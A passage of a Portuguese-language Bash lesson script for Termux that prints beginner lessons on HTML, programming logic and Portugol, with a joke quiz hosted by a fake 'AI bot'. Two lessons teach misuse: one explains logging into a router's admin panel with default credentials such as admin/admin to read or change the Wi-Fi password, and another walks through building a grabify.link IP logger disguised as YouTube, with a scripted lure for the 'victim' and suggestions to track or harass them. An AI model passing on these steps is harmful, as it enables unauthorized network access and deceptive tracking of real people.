Agora pressione o botão de menos do seu cllr. E depois aperte a letra 'x' para salvar.

Logo em seguida aperte enter, depois o nano (editor de texto do linux) Vai pede pra vc digitar o nome do arquivo, então sendo assim digite  'arquivovazio.html', e de enter.


Depois é só procurar o arquivo no seu gerenciador de arquivos e abrir pelo Chrome.\033[0m

\033[1;33mPERGUNTAS FREQUENTES:

1) Para que serve as tags da estrutura básica do html5?\033[0m
\033[1;34m
Bom, a primeira tag do código serve pra dizer a versão do html, pro navegador interpretar aquilo como um código html5.

 A segunda é a tag html. Todo código html tem que tá dentro dessa tag chamada html, vale destacar que a tag html é uma tag dupla.

 Já a tag head serve pra colocar todo os códigos de uma linguagem como css3 ou até mesmo uma linguagem de programação. É lá que fica linkado também. Digamos que a tag head é dupla e é chamada de a cabeça da página. 

Agora.....a tag body que é dupla também, seria o corpo da página, é lá que fica tudo oq vai aparecer pro usuário.
\033[0m

\033[1;33m2) Quem criou o html?\033[0m\033[1;34m
Tim berners-lee, Inclusive ele é o criador da www.\033[0m"
                 echo
                 echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
                 read SEGUE;;
             8)
              #Descobrir a senha do wi-fi
                 echo -e "
\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=\033[0m\033[1;33mDESCOBRIR A SENHA DO WI-FI \033[0m\033[1;36m=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m

\033[1;33mCOMO FUNCIONA:\033[0m

\033[1;34mEsse método, É o famoso do 'Entre no site do roteador enquanto estiver conectado no mesmo e veja a senha'.\033[0m

\033[1;33mPASSO A PASSO:\033[0m

\033[1;33m[1]\033[0m
\033[1;34mPegue o Ip do Wi-Fi \033[0m

\033[1;33m[2]\033[0m
\033[1;34mCopie e cole o ip no seu navegador. E caso não funcione, Coloque 'http://' antes do ip.\033[0m

\033[1;33m[3]\033[0m
\033[1;34mApós ter entrado no painel do Wi-Fi.... digite o usuário e a senha como: admin, admin.... vale destacar aqui que tem que ser em minúsculo pois a senha e o login admin admin é padrão.\033[0m

\033[1;33mObs: \033[0m\033[1;34mCaso a senha esteja incorreta pode ser que a senha padrão seja outra. Ou o dono do wifi mudou a senha padrão. E em casos que a senha padrão seja outra, Eu recomendo você pesquisar no google qual é a senha padrão desse wi-fi.
\033[0m
\033[1;33m[4]\033[0m
\033[1;34mApós ter acertado a senha, vá em 'Wireless' e em seguida 'Segurança', E a senha do Wi-Fi vai tá aparecendo...

Vale destacar que como você está no site do Wi-Fi, Você pode fazer oq quiser... e até mesmo mudar a senha.\033[0m"
                 echo
                 echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
                 read SEGUE;;
             9)
              #Pegar ip por link
                 echo -e "
\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=
=\033[0m\033[1;33mCOMO PEGAR IP POR LINK \033[0m\033[1;36m=
=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m

\033[1;33mCOMO FUNCIONA?\033[0m

\033[1;34mNesse tutorial vamos usar o site grabify.link para criar um site pra pegar ip. E além disso... esse site pode redirecionar a pessoa para outro site após pegarmos o ip. Pois assim a vítima não vai ter suspeitas que era uma armadilha.\033[0m

\033[1;33mAluno - Como assim?\033[0m

\033[1;34mExiste o site que pega o ip, e pode existir o site que a pessoa vai ser redirecionada após o site grabify.link ter pegado o ip da pessoa.\033[0m

\033[1;33mPASSO A PASSO:\033[0m

\033[1;33m[1]\033[0m\033[1;34m
Entre no site grabify.link, Vale destacar aqui que pode aparecer a seguinte mensagem após você ter entrado no site, 'Esse site não é seguro', E logo abaixo vai ter um botão escrito 'Continuar mesmo assim', Então você aperta nele.\033[0m

\033[1;33mAluno - Por que apareceu essa mensagem? \033[0m

\033[1;34mApareceu pois o site foi banido de uma das camadas do google, porém o site é seguro.

Enfim, Depois vc coloca em 'criar url' um site que existe, Ou um algo aleatório como 'aksndjjsjsjsfdaKh7gs'

Vale destacar que se vc colocar um site que existe, A pessoa vai ser redirecionada para ele. Mas mesmo assim vamos pegar o ip da vítima.\033[0m

\033[1;33m[2]\033[0m
\033[1;34mVc vai ser jogado pro painel do seu link, e nele você pode além de encurtar o mesmo, vc pode personalizar pra ficar parecido com sites famosos, como: YouTube, minecraft, gift card etc...

Eu recomendo você colocar como YouTube.\033[0m

\033[1;33mobs:\033[0m\033[1;34m Existe dois links que o site grabify te dar, o de acesso para ver quem entrou no seu site e o para vc mandar pra vítima.\033[0m

\033[1;33m[3]\033[0m
\033[1;34mCopia e mande para a vítima. 

Exemplo de engenharia social para convencer a pessoa a entrar no seu site falso: 

Se você colocou o nome do site como YouTube você diz, 'Olá eu criei um canal no YouTube e queria que vc desse uma olhada e se inscreva-se e deixa-se seu joinha, agradeço desde já '\033[0m

\033[1;33m[4]\033[0m
\033[1;34mVá no site de acesso e veja o ip da vítima.\033[0m


\033[1;33mPERGUNTAS FREQUENTES:

1) Oq é ip?
R=\033[0m\033[1;34m É um protocolo de internet ex: é como o cpf do seu aparelho por exemplo por ele da pra saber sua localização etc...\033[0m

\033[1;33m2) Da pra invadir só pelo ip?
R= \033[0m\033[1;34mNão, porém o ip é como saber aonde é sua casa da pra jogar pedra no telhado e até mesmo invadir se alguma porta tiver aberta, enfim no final não da só pelo ip.\033[0m

\033[1;33m3) Oq da pra fazer com ip?
R=\033[0m \033[1;34mBom, da pra fazer várias coisas como rastrear, derrubar comprar coisas e mandar na sua casa para que vc pague na hora enfim USE SUA CRIATIVIDADE.\033[0m"
                echo
                echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
                read SEGUE;;
             10)
              #OQ E LOGICA DE PROGRAMACAO
                echo -e '
\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=\033[0m\033[1;33m O que é lógica de programação \033[0m\033[1;36m=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m

\033[1;33m1) O QUE É LÓGICA DE PROGRAMAÇÃO:\033[0m

\033[1;34mLógica de programação é uma matéria que a maioria dos estudantes de programação tem que estudar antes de estudar programação em sí.

Para melhor enteder, Vamos primeiro ver o conceito de lógica:\033[0m

\033[1;33m2) O QUE É LÓGICA:\033[0m

\033[1;34mÁ lógica é a base da programação, Ou seja nada é feito sem a lógica em programação(Até mesmo para criar sites). Então vamos começar vendo oq é lógica.

Logica:

Lógica é tipo isso.... pra saber  se um usuário Android é "vaidoso"....com o aparelho. Como vc faria  isso?

[1] verificar se o celular dele possui película 

[2] verificar se o cllr dele possui um teclado personalizado,papel de parede.... etc...

Bom é lógico que  vc teria que usar a 2. Então isso é lógica ou seja  você usou usa lógica para saber se o usuário é vaidoso.

Vale destacar que existem tipos de lógica como o dedutivo que a gente usou logo acima.\033[0m

\033[1;33m3) ENTEDENDO:\033[0m

\033[1;34mBom, Vale destacar aqui que lógica de programação você aprende programando.

Porém, Existem ferramentas criadas para desenvolver a sua lógica na programação.\033[0m

\033[1;33mAluno - Quais são essas ferramentas? \033[0m

\033[1;34mExistem varias como: 

•Pseudocodigo(Portugol ou Português estruturado);
•Diagrama (Fluxograma);
•Descrição narrativa;

E nesse curso de introdução a lógica de programação, Nós vamos aprender ou utilizar a ferramenta portugol(pseudocodigo), Pois é uma ferramenta que mais se assemelha a uma linguagem de programação em si.

E até porque a maioria dos estudantes de faculdade, quando chegam na matéria de lógica de programação em Portugol, tem dificuldades.\033[0m
'
                echo
                echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
                read SEGUE;;
             11)
              #Dado e informacao
                echo -e '
\033[1;36m=-=-=-=-=-=-=-=-=-=
=\033[0m\033[1;33mDADO E INFORMAÇÃO\033[0m\033[1;36m=
=-=-=-=-=-=-=-=-=-=\033[0m

\033[1;33m1) APRESENTAÇÃO:\033[0m

\033[1;34mBom, Para melhor enteder a diferença entre dado e informação, Vamos aprender um pouco de lógica de programação com python. pois python é uma linguagem de programação muito fácil e muito recomendado atualmente para quem quer aprender programação.\033[0m

\033[1;33m2) AULINHA DE PYTHON:\033[0m

\033[1;34mEnfim, com python da pra fazer várias coisas como criar um site e até jogo etc... então vc precisa ter em mãos algum editor de texto como por exemplo o bloco de notas, e colocar esse codigo abaixo. Depois salvar o arquivo e colocar a extensão ".py" por ex: "Helexiel.py".... O .py significa que é um arquivo em python.

a= 15
b= 15
c= a+b
print(c)

Onde "a" é uma variavel. Variavel é um espaço do computador aonde fica armazenado os dados.\033[0m

\033[1;33m3) DIFERENÇA ENTRE DADO E INFORMAÇÃO:\033[0m

\033[1;34mDado é algo não compreendido já informação é o dado compreendido. Um bom exemplo disso é se um gringo tipo um russo chega e vem falar com vc provavelmente vc n irá entender pós vc n fala russo, enfim isso é dado ou seja algo que vc recebe sem enteder já informação é o dado compreendido.

a= 15
b= 15
c= a+b
print(c)

Observe que no código acima "a" e "c" É uma variavel enfim a variavel "a" tem o valor 15. Já o comando "print" significa que a conta a+b vai aparecer na tela.\033[0m

\033[1;33mObs:\033[0m\033[1;34m Vc pode executar essa pequena script/Comandos no tão famoso termux.\033[0m
'
               echo
               echo -e  "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
               read SEGUE;;
             12)
              #Tipos de algoritmos
               echo -e '
\033[1;36m=-=-=-=-=-=-=-=-=-=-=
=\033[0m\033[1;33mTIPOS DE ALGORITMOS\033[0m\033[1;36m=
=-=-=-=-=-=-=-=-=-=-=\033[0m

\033[1;33m1) APRESENTAÇÃO:\033[0m

\033[1;34mNessa aula, Eu irei mostrar os principais tipos de algoritmos existentes.

Mas antes de eu mostrar os tipos de algoritmos ou ferramentas para desenvolver a sua lógica na programação.... eu gostaria de conceituar a palavra algoritmo.\033[0m


\033[1;33m2) O QUE É ALGORITMO:\033[0m

\033[1;34mAlgoritmo é um passo a passo para resolver um problema. Sabe a receita para se fazer um café? Então, Essa receita nada mais é do que um algoritmo.

Vale destacar que existem algoritmos na nossa vida real, Como no exemplo acima, Enfim, e também existem algoritmos em programação. Por exemplo um programa de computador nada mais é do que um algoritmo escrito em uma linguagem de programação.\033[0m

\033[1;33m3) PRINCIPAIS TIPOS DE ALGORITMOS:\033[0m

\033[1;34mComo nós virmos na primeira aula...São:

•Portugol(Pseudocodigo ou Português estruturado);
•Diagrama(Ou diagrama de blocos);
•Descrição Narrativa;

Sendo que nesse curso eu irei ensinar lógica de programação em Portugol.

Logo asseguir eu irei falar um pouco sobre cada um desses algoritmos:\033[0m

\033[1;33m3.1) PSEUDOCODIGO OU  PORTUGOL:\033[0m

\033[1;34mPseudocodigo é uma falsa linguagem de programação em português, Criada com o intuito de ajudar os estudantes iniciantes de programação.


Esse algoritmo é usado na maioria das faculdades, por conta que se parece muito com uma linguagem de programação, Pois usa variáveis, Expressões aritméticas etc....

Logo abaixo temos um  exemplo de código em pseudocodigo:

Algoritmo "Ola mundo"
//Isso aqui é um comentário no codigo 
escreval  ("Olá Mundo")
Fimalgoritmo \033[0m

\033[1;33m3.2) Diagrama:\033[0m

\033[1;34mEsse tipo de algoritmo é bom também, Só que existe uma diferença aqui, A diferença é que esse tipo de algoritmo usa tipo desenhos ou círculos, triangulos etc... para representar determinada ação. Por exemplo a ação de processamento é um quadrado.

Logo abaixo temos um exemplo de algoritmo em diagrama:\033[0m\033[1;32m

            ........
           . INICIO .
            ........
               |
               v
        _____________________
---->  / DIGITE 1° NUMERO n1/
|       _____________________
|               |
|               v
|       ______________________
|      / DIGITE 2° NUMERO n2 /
|      ______________________
|
|
|   SIM     _______
|         _/       \_
|        / NUMEROS   \
|______ <  SÃO ZEROS? >
         \_         _/
    NÃO    \_______/

               |
               v

   ___________________________________
  |Some os dois números e divida por 2|
   ___________________________________

               |
               v
    ___________________
   |IMPRIMA O RESULTADO|
   |ENCONTRADO         |
   |          _________
   |_________/

               |
               v

            ........
           .  FIM   .
            ........
\033[0m

\033[1;33m3.3) Descrição Narrativa:\033[0m

\033[1;34mUm algoritmo em descrição narrativa, Como o próprio nome diz, é uma narrativa.

Abaixo um exemplo de algoritmo para fazer um suco:

•Pegue um copo, não tem copo ? Então arrume-o;
•já pegou o copo? Se sim, então coloque água gelada nesse copo;
•Rasgue a embalagem do suco;
•Jogue o pó do suco dentro do copo com água;
•Logo em seguida pegue uma colher e mexa a água para ficar pronto o suco;
\033[0m'
               echo
               echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
               read SEGUE;;
             13)
              #Baixando o nosso compilador
               echo -e '
\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=
=\033[0m\033[1;33mBAIXANDO O COMPILADOR\033[0m\033[1;36m=
=-=-=-=-=-=-=-=-=-=-=-=\033[0m

\033[1;33m1) O QUE É UM COMPILADOR:
\033[0m
\033[1;34mÉ oq vai executar o nosso código. No caso...O nosso compilador é um específico pra portugol, Logo o nosso compilador vai compilar códigos de portugol e somente essa linguagem.


Em termos leigos, Imagine que o nosso código é uma música, e o reprodutor de música é o nosso compilador. Logo a música vai ser reproduzida pelo reprodutor de música.


E com o nosso compilador de Portugol  (pseudocodigo) não é diferente. Todo algoritmo em portugol escrito corretamente vai ser compilado pelo compilador, Caso contrário vai ser exibido uma mensagem de erro.\033[0m

\033[1;33m2) BAIXANDO O NOSSO COMPILADOR PRA PORTUGOL:\033[0m
\033[1;34m
O nome do nosso grande compilador para Android é "Pseudocode", Cujo ícone do app atualmente é azul com um ponto e vírgula(;).

Vale destacar que o mesmo é encontrado na play store.\033[0m


\033[1;33m3) PRIMEIROS PASSOS:\033[0m

\033[1;34mApós ter baixado o app pseudocode, E ter entrado nele, O mesmo vai pedir pra você criar uma conta ou logar na sua existente. Caso vc n queria criar uma conta... aperte no botão abaixo escrito "Pular"\033[0m

\033[1;33m3.1) Quais as desvantagens de não fazer uma conta?\033[0m

\033[1;34mBasicamente você não vai poder compartilhar os seus códigos no app, Para que outros usuários do mesmo vejam e dem like... outra desvantagem é que vc n vai poder dar like em códigos de terceiros.\033[0m
\033[1;33m
3.2) COMO FUNCIONA E QUAL A ESTRUTURA BÁSICA DO PORTUGOL:\033[0m
\033[1;34m
O app/Compilador, Funciona assim... Vc coloca o seu código e em seguida aperta no ícone de reproduzir, E caso o código esteja correto, o código iria ser executado.

E caso não esteja correto, Vai ser exibida uma mensagem de erro e depois vai aparecer em qual linha TALVEZ esteja o erro.

Vale ressaltar que muitas das vezes o erro não está na linha que o compilador diz.\033[0m

\033[1;33mAluno - E enquanto a estrutura básica do portugol?\033[0m
\033[1;34m
A estrutura básica, Aqui... eu me refiro a parte do código que sempre vai ter em algoritmos de portugol. Ou seja toda vez que vc for criar um algoritmo, Tem que ter essa estrutura básica.

Abaixo a estrutura básica de algoritmos em portugol:


algoritmo "Nome_do_programa"

//Isso aqui é um comentário no codigo, e n vai interferir em nada no programa 

fimalgoritmo
\033[0m\033[1;33m

Aluno - Oq é um comentário no codigo?\033[0m
\033[1;34m
É um comando que varia de linguagem pra linguagem.... no caso no portugol o comando pra fazer um comentário é "//"

E esse comentário serve pra ajudar quem ler o seu código, Ou ajudar até você mesmo a se lembrar pra que serve determinada linha do seu código.\033[0m'
               echo
               echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
               read SEGUE;;
             14)
              #Nosso primeiro Ola mundo
               echo -e '\033[1;36m
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=\033[0m\033[1;33m NOSSO PRIMEIRO OLÁ MUNDO: \033[0m\033[1;36m=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m

\033[1;33m1) APRESENTAÇÃO:\033[0m

\033[1;34mNessa aula vamos aprender a sair de uma famosa "maldição" na área de tecnologia, O tão famoso olá mundo. 


Oq eu quero dizer é que, Dizem que quando vc for estudar determinada tecnologia e não fizer um olá mundo logo, Vc nunca irá aprender determinada tecnologia.\033[0m

\033[1;33m2) SAINDO DA MALDIÇÃO:\033[0m

\033[1;34mEntre no app pseudocode e apague tudo oq tem escrito, E copie e cole esse algoritmo abaixo:\033[0m\033[1;32m

algoritmo "nosso primeiro olá mundo"
         escreval ("Olá mundo")
fimalgoritmo
\033[0m
\033[1;34m
Depois aperte no botão de reproduzir, e irá aparecer na tela "Olá mundo".

Enfim, sabe o comando "Escreval" ? Ele  serve pra imprimir algo na tela, No caso tudo que estiver entre parênteses e aspas irá aparecer na tela.


Vamos para um mini exercício interativo com o termux? Então vamos lá! Após apertar enter irei explicar o desafio!
\033[0m'
               echo
               echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
               read SEGUE
               clear
               #########
               #DESAFIO#
               #########
               #O desafio é fazer o usuário digitar escreval hello world
               RESP_DO_EXERCICIO1='escreval ("hello world")'
               while [[ "$RESP_DO_DESAFIO" != $RESP_DO_EXERCICIO1 ]]
               do
                  clear
                  unset RESP_DO_DESAFIO
                  echo -e '



       ‎╮╰╮╮▕╲╰╮╭╯╱▏╭╭╭╭
       ╰╰╮╰╭╱▔▔▔▔╲╮╯╭╯
       ┏━┓┏┫╭▅╲╱▅╮┣┓╭║║║
       ╰┳╯╰┫┗━╭╮━┛┣╯╯╚╬╝
       ╭┻╮╱╰╮╰━━╯╭╯╲┊ ║
       ╰┳┫▔╲╰┳━━┳╯╱▔┊ ║
       ┈┃╰━━╲▕╲╱▏╱━━━┬╨╮
       ┈╰━━╮┊▕╱╲▏┊╭━━┴╥╯

   \033[1;31mBEM VINDO AO MEU DESAFIO!\033[0m

\033[1;34mDigite somente o comando para imprimir um hello world na tela!
\033[0m
\033[1;33mex:\033[0m\033[1;34m O comando para imprimir um olá mundo é escreval ("Ola mundo")

\033[1;33mobs:\033[0m\033[1;31m Digite tudo em minusculo.\033[0m'
                   read RESP_DO_DESAFIO
                   clear
                   if [ "$RESP_DO_DESAFIO" = 'escreval ("hello world")' ];then
                      echo -e "

\033[1;34mParabéns, Você acertou. E isso quer dizer que você está entedendo o conteúdo passado aqui!\033[0m"
                   else
                      echo -e "\033[1;34mERROU, TENTE NOVAMENTE!\033[0m"
                   fi
                   echo
                   echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
                   read SEGUE
               done
               unset RESP_DO_DESAFIO;;
             15)
              #Expressoes aritmeticas
               echo -e '
\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=
=\033[0m\033[1;33mOperadores Aritméticos\033[0m\033[1;36m =
=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m

\033[1;33m1) O QUE SÃO:\033[0m

\033[1;34mSão aqueles caracteres que servem pra fazer cálculos matemáticos.

Operadores Aritméticos é importantíssimo tanto para portugol ou tanto para uma linguagem de programação em Si.\033[0m

\033[1;33m2) QUAIS SÃO:\033[0m

\033[1;34mOs operadores aritméticos variam de linguagem pra linguagem, Mas aqui eu irei mostrar os principais de portugol:


+ = Adição(mais)

- = Subtração 

* = Multiplicação

/ = Divisão 

\ = Divisão por inteiro 

^ = exponenciação 
\033[0m
\033[1;33m3) CONTEÚDO EXTRA:\033[0m

\033[1;34mAlem dos operadores aritméticos existem os relacionais, Que são:

>  Maior que 

< Menor que

>= Maior ou Igual a

<= Menor ou igual a

= Igual a

<> Diferente de
\033[0m
'
                echo
                echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
                read SEGUE;;
             16)
              #Verdadeiro ou falso
                echo -e '
\033[1;36m=-=-=-=-=-=-=-=-=-=-=
=\033[0m\033[1;33mVERDADEIRO OU FALSO\033[0m\033[1;36m=
=-=-=-=-=-=-=-=-=-=-=\033[0m

\033[1;33m1) APRESENTAÇÃO:\033[0m

\033[1;34mEu criei essa aula para nós praticamos um pouco sobre os operadores relacionais.\033[0m


\033[1;33m2) COMO FUNCIONA:\033[0l

\033[1;34mBom, Nessa aula nós vamos apenas verificar se determinado número com determinado operador, É verdadeiro ou falso......


Para isso nós vamos usar o comando escreval.


Então se mantenha caralhado(ops, Digo motivado*) e vamos lá!
\033[0m

\033[1;33m3) PRATICANDO:
\033[0m
\033[1;34m[1] Entre no app pseudocode, apague tudo oq tem dentro,E cole esse algoritmo de abaixo:

algoritmo "Verdadeiro_ou_Falso"
  escreval  (10>5)
fimalgoritmo

[2] Após isso:

•Aperte no botão de reproduzir

[3] Resultado:

"Verdadeiro"


Explicação:

Bom, o comando "escreval  (10>5)", está praticamente perguntando se o número 10 é maior que 5. E no caso se for verdadeiro... o compilador vai escrever na tela "Verdadeiro", E caso for falso... o compilador vai escrever na tela "falso".

Então como nós virmos, não tem segredo. \033[0m


\033[1;33m4) PRATICANDO 2:\033[0m

\033[1;34mAgora nós vamos praticar com o operador <> que significa diferente.

[1] Entre no app pseudocode, Apague tudo oq tem dentro, E cole esse algoritmo abaixo:

algoritmo "Verdadeiro_ou_Falso"
  escreval  (19 <> 20)
fimalgoritmo

[2] Aperte no botão:

•Reproduzir

[3] Resultado

"Verdadeiro"


Explicação:

Aqui nós perguntamos pro compilador se o número 19 é diferente de 20. E o compilador respondeu com "Verdadeiro".\033[0m



\033[1;33mObs:\033[0m \033[1;34mPor enquanto acabamos a nossa aula por hoje, Então eu recomendo vc praticar isso com mais operadores relacionais. Como o <, >, >= e etc....\033[0m
'
                echo
                echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
                read SEGUE;;
             17)
              #Um Pouco Sobre o Comando Escreval
                echo -e '
\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=\033[0m\033[1;33mUM POUCO SOBRE O COMANDO ESCREVAL\033[0m\033[1;36m=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\033[0m

\033[1;33m1) COMANDO ESCREVAL COM PARÊNTESES E ASPAS:\033[0m

\033[1;34mO comando escreval serve pra escrever algo na tela tipo:\033[0m

\033[1;33m[1]\033[0m

\033[1;34mAlgoritmo "Escrever algo na tela"
escreval ("Cu de batata")
fimalgoritmo 
\033[0m
\033[1;33m[2] Resultado:\033[0m

\033[1;34mCu de batata\033[0m


\033[1;33m2) COMANDO ESCREVAL SEM ASPAS:\033[0m

\033[1;34mAgora o comando escreval sem aspas... no caso sempre vai imprimir o valor de uma variável, ex:\033[0m


\033[1;33m[1]\033[0m
\033[1;34m
Algoritmo "Programa_Sem_Nome"

var a: inteiro 

//A variável a recebe o valor 2

a <- 2

//Abaixo o comando para imprimir o valor da variável a

Escreval (a)

Fimalgoritmo
\033[0m
\033[1;33m[2] Resultado \033[0m

\033[1;34m2\033[0m


\033[1;33m3) COMANDO ESCREVAL, PARA IMPRIMIR O VALOR DE UMA VARIÁVEL E ESCREVER ALGO NA TELA:
\033[0m\033[1;34m
Para fazer isso é a coisa mais simples do mundo, Primeiro eu vou criar uma espécie de resumo:\033[0m

\033[1;33m[1] CÓDIGO\033[0m
\033[1;34m
//Atribuindo 10 a variável numero

numero <- 10

//Abaixo o comando escreval pra imprimir textos e valores de variáveis ao mesmo tempo.

escreval ("O valor da variável numero é: ",numero)
\033[0m
\033[1;33m[2] RESULTADO\033[0m

\033[1;34mO valor da variável número é: 10\033[0m

\033[1;33m3.1) EXPLICAÇÃO:\033[0m

\033[1;34mComo nós virmos, Realmente tudo que estiver entre aspas... vai aparecer na tela.

E no caso pra imprimir o valor da variável "numero", Nós tivemos que colocar uma vírgula depois do fechamento das aspas.  E em seguida colocar o parênteses no final.

Ex:\033[0m

\033[1;33m[1] CÓDIGOS:\033[0m
\033[1;34m
A <- 2
Escreval ("1+1 é: ",A)
\033[0m\033[1;33m
[2] RESULTADO:\033[0m\033[1;34m

1+1 é: 2\033[0m'
                echo
                echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
                read SEGUE;;
             18)
              #Exercicio
                clear
                echo -e '\033[1;34m
           ┊┊┊▕▔╲▂▂▂╱▔▏┊┊┊
	   ╭━━╮╭┈╮┈╭┈╮╭━━╮┈
	   ╰╰╰┃▏╭╮┈╭╮▕┃╯╯╯
	   ┈┃┈┃▏┈┈▅┈┈▕┃┈┃┈
  	   ┈┃┈┃▏┈╰┻╯┈▕┃┈┃┈
	   ┈┃┈╰▅▅▅◇▅▅▅╯┈┃┈
	   ┈╰━━┓┈╭┻╮┈┏━━╯
\033[0m
      \033[1;31mOLÁ SEU CARALINHO INFECTADO! \033[0m'
                sleep 5;clear
                echo -e '\033[1;34m
		┈┈┈╱▔▔▔╲
		▇▔▔┈▍▍┃┈┃╭━╮
		╲━━╯┈┈┃┈┃╰╮┃
		┈▔▔▔┃┈╰━╯╲┃┃
		┈┈┈┈┃┃┃┈┈▕┃┃
		┈┈┈┈┃┃┃╭┛▕╯┃
		┈┈┈┈┗┻┛┗━╯━╯
\033[0m
       \033[1;31m EU SOU UMA INTELIGENCIA ARTIFICIAL,
        CRIADA PELO HELEXIEL. EM OUTRAS PA-
        LAVRAS EU SOU UM BOT.

        CHAMADO SPEAKER, E DAQUI EM DIANTE
        EU SEREI O SEU PROFESSOR/INSTRUTOR.
        E HOJE EU IREI PASSAR UM EXERCÍCIO
        QUE O HELEXIEL MANDOU EU PASSAR PRA
        VC.\033[0m'
                echo
                echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
                read SEGUE
                clear
                echo -e '\033[1;34m
	      ╭━┳━╭━╭━╮╮
  	      ┃     ┣▅╋▅┫┃
	      ┃   ┃   ╰━╰━━━━━━╮
	      ╰┳╯          ◢▉◣
	       ┃           ▉▉▉
	       ┃           ◥▉◤
	       ┃      ╭━┳━━━━╯
   	       ┣━━━━━━┫
	      ╭╯　 　 ╰╮   \033[0m
\033[1;31m
     NA VERDADE É UMA ESPECIE DE PROVA,
     PORÉM Ñ INTERFERE NA SUA NOTA FINAL.

     CONSIDERE ISSO COMO UMA ESPECIE DE
     EXERCICIO PARA FIXAR O CONTEÚDO
     PASSADO ATÉ AQUI. \033[0m '
	        echo
		echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR\033[0m"
		read SEGUE
		clear
		echo -e '\033[1;34m
              ╭━┳━╭━╭━╮╮
              ┃     ┣▅╋▅┫┃
              ┃   ┃   ╰━╰━━━━━━╮
              ╰┳╯          ◢▉◣
               ┃           ▉▉▉
               ┃           ◥▉◤
               ┃      ╭━┳━━━━╯
               ┣━━━━━━┫
              ╭╯　 　 ╰╮
\033[0m \033[1;31m
      ENTÃO, NÃO ENCHA O MEU SACO POIS
      A QUALQUER HORA EU POSSO FUDER O
      SEU CLLR. \033[0m'
		sleep 6;clear
		echo -e '\033[1;34m
	╥━━━━━━━━╭━━╮━━┳
	╢╭╮╭━━━━━┫┃▋▋━▅┣
	╢┃╰┫┈┈┈┈┈┃┃┈┈╰┫┣
	╢╰━┫┈┈┈┈┈╰╯╰┳━╯┣
	╢┊┊┃┏┳┳━━┓┏┳┫┊┊┣
	╨━━┗┛┗┛━━┗┛┗┛━━┻
\033[0m \033[1;31m
       PEGADINHA GARAIO KKK
       OU PRODUÇÃO!!! \033[0m'
		sleep 5;clear
		echo -e '\033[1;34m
	┈┈┈╱▏┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈
	┈┈┈▏▏┈┈┈┈┈▏╲▕▋▕▋▏┈┈┈
	┈┈┈╲╲┈┈┈┈┈▏┈▏┈▔▔▔▆┈┈
	┈┈┈┈╲▔▔▔▔▔╲╱┈╰┳┳┳╯┈┈
	┈╱╲╱╲▏┈┈┈┈┈┈▕▔╰━╯┈┈┈
	┈▔╲╲╱╱▔╱▔▔╲╲╲╲┈┈┈┈┈┈
	┈┈┈╲╱╲╱┈┈┈┈╲╲▂╲▂┈┈┈┈
	┈┈┈┈┈┈┈┈┈┈┈┈╲╱╲╱┈┈┈┈
\033[0m \033[1;31m
        OU PRODUÇÃAAO DIZ QUE
        É PEGADINHA! \033[0m '
		sleep 6;clear
		echo -e '\033[1;34m
	      ╭━┳━╭━╭━╮╮
              ┃     ┣▅╋▅┫┃
              ┃   ┃   ╰━╰━━━━━━╮
              ╰┳╯          ◢▉◣
               ┃           ▉▉▉
               ┃           ◥▉◤
               ┃      ╭━┳━━━━╯
               ┣━━━━━━┫
              ╭╯　 　 ╰╮
\033[0m \033[1;31m
       TÁ RINDO PQ? POR ACASO TEM ALGUM
       PALHAÇO AQUI ?  \033[0m '
		sleep 6;clear
		#Indo para a prova em si.
		echo -e '\033[1;34m
	┊┊┊▕▔╲▂▂▂╱▔▏┊┊┊
        ╭━━╮╭┈╮┈╭┈╮╭━━╮┈
	╰╰╰┃▏╭╮┈╭╮▕┃╯╯╯
	┈┃┈┃▏┈┈▅┈┈▕┃┈┃┈
	┈┃┈┃▏┈╰┻╯┈▕┃┈┃┈
	┈┃┈╰▅▅▅◇▅▅▅╯┈┃┈
	┈╰━━┓┈╭┻╮┈┏━━╯
\033[0m \033[1;31m
       Mas deixando de zoeira,E
       use os seus conhecimentos
       Para responder as perguntas
       Asseguir! \033[0m'
		sleep 6;clear
		echo -e "
\033[1;33mESCOLHA AS OPÇÕES CORRETAS LOGO ABAIXO:\033[0m"
		sleep 4;clear;echo
		echo -e "\033[1;31m1) O que é lógica de programação?\033[0m"
		echo
		echo -e "\033[1;32m[\033[0m1\033[1;32m]\033[0m\033[1;34m É uma matéria na faculdade que ajuda os iniciantes em programação, Usando as ferramentas para melhorar a sua lógica na programação:

•Portugol: Uma Linguagem de Programação
•Diagrama: Um Quase Algoritmo \033[0m"
		echo
		echo -e "\033[1;32m[\033[0m2\033[1;32m]\033[0m\033[1;34m É um algoritmo\033[0m"
		echo
		echo -e "\033[1;32m[\033[0m3\033[1;32m]\033[0m\033[1;34m É uma matéria, Cujo o intuito é melhorar a sua lógica na programação, Usando as ferramentas: Portugol, Diagrama de blocos etc..

